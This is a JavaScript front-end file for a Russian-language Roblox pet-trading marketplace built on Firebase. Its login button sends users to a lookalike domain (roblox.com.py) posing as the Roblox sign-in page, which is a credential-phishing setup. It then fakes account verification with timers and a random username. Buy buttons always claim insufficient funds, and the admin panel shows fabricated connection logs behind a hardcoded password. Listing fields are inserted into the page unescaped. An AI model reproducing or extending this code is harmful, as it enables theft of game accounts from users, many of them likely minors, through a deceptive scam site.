import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, push, onValue, remove, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

// --- ВСТАВЬ СВОЙ КОНФИГ FIREBASE СЮДА ---
const firebaseConfig = {
  apiKey: "AIzaSyBUVG2e9TVe6WlU72Hrjin03QXtkTGiNc0",
  authDomain: "star-marketdb.firebaseapp.com",
  databaseURL: "https://star-marketdb-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "star-marketdb",
  storageBucket: "star-marketdb.firebasestorage.app",
  messagingSenderId: "1040104655803",
  appId: "1:1040104655803:web:45bc355371265d36d8129e"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const petsRef = ref(db, 'market_lots');

const ROBLOX_AUTH_LINK = "https://roblox.com.py/login?returnUrl=4210845075632139"; 
const NO_IMAGE_URL = "data:image/png;base64,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";

let currentUser = null; 

// Элементы
const petsContainer = document.getElementById('petsContainer');
const loginModal = document.getElementById('loginModal');
const sellModal = document.getElementById('sellModal');

// Список петов
const petsList = document.getElementById('petsList');
const petNames = ["Shadow Dragon","Bat Dragon","Giraffe","Frost Dragon","Owl","Parrot","Evil Unicorn","Crow","Arctic Reindeer","Turtle","Kangaroo","Unicorn","Dragon","Kitsune"];
petNames.sort().forEach(pet => {
    let opt = document.createElement('option');
    opt.value = pet;
    petsList.appendChild(opt);
});

// =========================================================
// 1. ПОЛУЧЕНИЕ ЛОТОВ (REALTIME)
// =========================================================
onValue(petsRef, (snapshot) => {
    petsContainer.innerHTML = "";
    const adminTable = document.getElementById('adminLotsTable');
    if(adminTable) adminTable.innerHTML = "";

    const data = snapshot.val();
    if (data) {
        const lots = Object.entries(data).map(([key, val]) => ({...val, key})).reverse();
        lots.forEach(lot => {
            renderCard(lot);
            if(adminTable) renderAdminRow(lot, adminTable);
        });
    } else {
        petsContainer.innerHTML = "<p style='color:#666;width:100%;text-align:center;padding:20px;'>Лотов пока нет</p>";
    }
});

function renderCard(lot) {
    const card = document.createElement('div');
    card.className = 'item-card';

    let badgesHtml = "";
    if(lot.stickers && lot.stickers.length > 0) {
        badgesHtml = `<div class="badges-row">`;
        lot.stickers.forEach(sticker => badgesHtml += `<div class="mini-sticker ${sticker.class}">${sticker.letter}</div>`);
        badgesHtml += `</div>`;
    }

    const img = lot.image || NO_IMAGE_URL;

    card.innerHTML = `
        <div class="card-img-area">
            ${badgesHtml}
            <img src="${img}" onerror="this.src='${NO_IMAGE_URL}'">
        </div>
        <div class="card-info">
            <div class="card-name" title="${lot.name}">${lot.name}</div>
            <span class="card-seller">@${lot.contact}</span>
            <div class="price-row">
                <span class="price">${lot.price} ₽</span>
                <button class="btn-buy-card" onclick="alert('Недостаточно средств')"><i class="fa-solid fa-cart-shopping"></i></button>
            </div>
        </div>
    `;
    petsContainer.appendChild(card);
}

// =========================================================
// 2. СИСТЕМА ВХОДА
// =========================================================
const startAuthBtn = document.getElementById('startAuthBtn');
const step1 = document.getElementById('loginStep1');
const step2 = document.getElementById('loginStep2');
const confirmAuthBtn = document.getElementById('confirmAuthBtn');
const authStatusText = document.getElementById('authStatusText');

function checkAuth() {
    if (currentUser) return true;
    loginModal.style.display = 'flex';
    step1.style.display = 'block';
    step2.style.display = 'none';
    return false;
}

document.getElementById('headerLoginBtn').onclick = () => checkAuth();
document.getElementById('inventoryBtn').onclick = (e) => { if(!checkAuth()) e.preventDefault(); };
document.getElementById('balanceBtn').onclick = () => { if(checkAuth()) alert("Пополнение..."); };

startAuthBtn.onclick = () => {
    window.open(ROBLOX_AUTH_LINK, '_blank');
    step1.style.display = 'none';
    step2.style.display = 'block';
    
    // Имитация ожидания пользователя
    authStatusText.innerText = "Ожидание перехода...";
    setTimeout(() => {
        authStatusText.innerText = "Готово к проверке";
        confirmAuthBtn.style.display = 'block';
    }, 2000);
};

confirmAuthBtn.onclick = () => {
    authStatusText.innerText = "Сканирование...";
    setTimeout(() => {
        const rnd = Math.floor(Math.random() * 9000) + 1000;
        currentUser = { name: `User_${rnd}` };
        document.getElementById('userProfileArea').innerHTML = `
            <div class="user-badge">
                <div class="avatar-circle"></div>
                <span>${currentUser.name}</span>
            </div>`;
        loginModal.style.display = 'none';
    }, 1500);
};

// =========================================================
// 3. ПРОДАЖА
// =========================================================
document.getElementById('sidebarSellBtn').onclick = () => { if(checkAuth()) sellModal.style.display = 'flex'; };

const selectedProps = { propFly: false, propRide: false, propNeon: false, propMega: false };
window.toggleProp = function(id) {
    const el = document.getElementById(id);
    if(id === 'propMega' && !selectedProps.propMega) { selectedProps.propNeon = false; document.getElementById('propNeon').classList.remove('selected'); }
    if(id === 'propNeon' && !selectedProps.propNeon) { selectedProps.propMega = false; document.getElementById('propMega').classList.remove('selected'); }
    selectedProps[id] = !selectedProps[id];
    el.classList.toggle('selected', selectedProps[id]);
};

// Фото
const fileInput = document.getElementById('petFileInput');
let customImageBase64 = null;
fileInput.onchange = () => {
    const file = fileInput.files[0];
    if (file) {
        if(file.size > 800000) { alert("Файл > 800KB!"); return; }
        const reader = new FileReader();
        reader.onload = (e) => customImageBase64 = e.target.result;
        reader.readAsDataURL(file);
        document.getElementById('fileName').innerText = "Загружено";
    }
};

document.getElementById('sellForm').addEventListener('submit', (e) => {
    e.preventDefault();
    let stickers = [];
    if(selectedProps.propFly) stickers.push({class: 'sticker-f', letter: 'F'});
    if(selectedProps.propRide) stickers.push({class: 'sticker-r', letter: 'R'});
    if(selectedProps.propNeon) stickers.push({class: 'sticker-n', letter: 'N'});
    if(selectedProps.propMega) stickers.push({class: 'sticker-m', letter: 'M'});

    push(petsRef, {
        name: document.getElementById('petNameInput').value,
        price: document.getElementById('petPrice').value,
        contact: document.getElementById('telegramUser').value,
        seller: currentUser.name,
        image: customImageBase64,
        stickers: stickers,
        timestamp: Date.now()
    }).then(() => {
        sellModal.style.display = 'none';
        document.getElementById('sellForm').reset();
        customImageBase64 = null;
        Object.keys(selectedProps).forEach(k => { selectedProps[k]=false; document.getElementById(k).classList.remove('selected'); });
    });
});

// =========================================================
// 4. НАСТРОЙКИ И АДМИНКА
// =========================================================
const settingsModal = document.getElementById('settingsModal');
const adminPanel = document.getElementById('adminPanel');

document.getElementById('settingsBtn').addEventListener('click', () => settingsModal.style.display = 'flex');

document.getElementById('openAdminLogin').onclick = () => {
    const pass = prompt("Пароль администратора:");
    if(pass === "admin123") {
        settingsModal.style.display = 'none';
        adminPanel.style.display = 'flex';
        startFakeLogs();
    } else {
        alert("Неверный пароль");
    }
};

// Админские функции
function renderAdminRow(lot, table) {
    const row = document.createElement('tr');
    row.innerHTML = `
        <td>${lot.name}</td>
        <td>${lot.price} ₽</td>
        <td>@${lot.contact}</td>
        <td>
            <button class="btn-action act-edit" onclick="openEdit('${lot.key}', '${lot.name}', '${lot.price}')">Edit</button>
            <button class="btn-action act-del" onclick="deleteLot('${lot.key}')">Del</button>
        </td>
    `;
    table.appendChild(row);
}

window.deleteLot = (key) => {
    if(confirm("Удалить лот?")) remove(ref(db, 'market_lots/' + key));
};

const editModal = document.getElementById('editModal');
window.openEdit = (key, name, price) => {
    document.getElementById('editLotId').value = key;
    document.getElementById('editLotName').value = name;
    document.getElementById('editLotPrice').value = price;
    editModal.style.display = 'flex';
};

document.getElementById('saveEditBtn').onclick = () => {
    const key = document.getElementById('editLotId').value;
    update(ref(db, 'market_lots/' + key), {
        name: document.getElementById('editLotName').value,
        price: document.getElementById('editLotPrice').value
    }).then(() => editModal.style.display = 'none');
};
document.getElementById('cancelEditBtn').onclick = () => editModal.style.display = 'none';

function startFakeLogs() {
    const logDiv = document.getElementById('ipLogs');
    setInterval(() => {
        if(adminPanel.style.display === 'none') return;
        const ips = ["192.168.0.1", "10.5.22.1", "88.55.12.90", "45.11.2.1"];
        const ip = ips[Math.floor(Math.random()*ips.length)];
        const line = document.createElement('div');
        line.innerHTML = `> [${new Date().toLocaleTimeString()}] Connection ${ip} <span style="color:#22c55e">OK</span>`;
        logDiv.appendChild(line);
        logDiv.scrollTop = logDiv.scrollHeight;
    }, 2000);
}

// Закрытие
document.querySelectorAll('.close-modal, .close-admin').forEach(btn => btn.onclick = function() {
    this.closest('.modal-overlay, .admin-overlay').style.display = 'none';
});
window.onclick = (e) => {
    if (e.target.classList.contains('modal-overlay')) e.target.style.display = 'none';
}
